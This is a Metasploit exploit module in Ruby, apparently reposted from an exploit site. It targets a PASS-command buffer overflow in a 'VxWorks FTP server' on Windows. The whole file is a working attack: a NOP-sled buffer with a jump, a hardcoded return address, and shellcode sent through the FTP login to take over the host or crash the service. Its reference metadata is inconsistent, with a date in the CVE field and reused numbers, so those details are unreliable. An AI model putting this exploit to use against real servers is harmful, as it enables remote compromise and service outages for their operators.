# $Id: VxWorks_FTP_server.rb 16850 2011-09-07 10:20:45Z Iraq $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = AverageRanking
 
    include Msf::Exploit::Remote::Ftp
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;WVxWorks FTP server Password Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This exploits the buffer overflow found in the PASS command
                in VxWorks FTP server This particular module will only work
                reliably against Windows targets. The server must be
                configured to allow anonymous logins for this exploit to
                succeed. A failed attempt will bring down the service
                completely.
            },
            &#039;Author&#039;         => &#039;Angel Injection&#039;,
            &#039;License&#039;        => BSD_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 16850 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;7/9/2011&#039;],
                    [ &#039;OSVDB&#039;, &#039;16850&#039;    ],
                    [ &#039;BID&#039;, &#039;16851&#039;    ],
                    [ &#039;URL&#039;, &#039;http://www.1337day.com/exploits/16851&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 530,
                    &#039;BadChars&#039; => "\x00\x0a\x0d\x40",
                    &#039;StackAdjustment&#039; => -3200,
                    &#039;Compat&#039;   =>
                        {
                            &#039;ConnectionType&#039; => "-find"
                        }
                },
            &#039;Targets&#039;        =>
                [
                    # Target 0
                    [
                        &#039;Windows&#039;,
                        {
                            &#039;Platform&#039; => &#039;win&#039;,
                            &#039;Ret&#039;      => 0x5f4e772b
                        },
                    ],
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;7/9/2011&#039;))
    end
 
    def exploit
        connect
 
        print_status("Trying target #{target.name}...")
 
        buf          = make_nops(655) + payload.encoded
        buf[645, 2]  = "\xeb\x06"
        buf[562, 4]  = [ target.ret ].pack(&#039;V&#039;)
 
        # Send USER Command
        send_user(datastore[&#039;FTPUSER&#039;])
 
        # Send PASS Command
        send_cmd([&#039;PASS&#039;, buf], false)
 
        handler
        disconnect
    end
 
end 



